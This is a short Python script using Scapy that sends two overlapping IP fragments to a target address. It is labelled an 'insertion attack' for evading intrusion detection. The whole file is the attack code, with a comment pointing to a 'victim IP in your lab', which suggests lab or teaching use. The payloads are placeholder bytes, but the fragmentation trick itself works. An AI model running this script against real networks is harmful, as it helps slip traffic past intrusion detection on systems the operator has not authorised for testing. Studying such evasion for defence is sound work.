#!/usr/bin/env python3
from scapy.all import *

def insertion_attack(target_ip):
    """Send overlapping IP fragments (insertion attack example)"""

    payload1 = b"A" * 16   # first fragment
    payload2 = b"B" * 16   # bogus overlapping fragment

    # Normal fragment
    frag1 = IP(dst=target_ip, id=12345, flags="MF", frag=0)/UDP(dport=1234, sport=1234)/Raw(load=payload1)

    # Overlapping fragment (insertion attack trick)
    frag2 = IP(dst=target_ip, id=12345, frag=1)/Raw(load=payload2)

    # Send both
    send(frag1, verbose=0)
    send(frag2, verbose=0)

    print(f"[+] Sent overlapping fragments to {target_ip} (IDS sees insertion).")

if __name__ == "__main__":
    target = "192.168.1.50"   # Replace with victim IP in your lab
    insertion_attack(target)
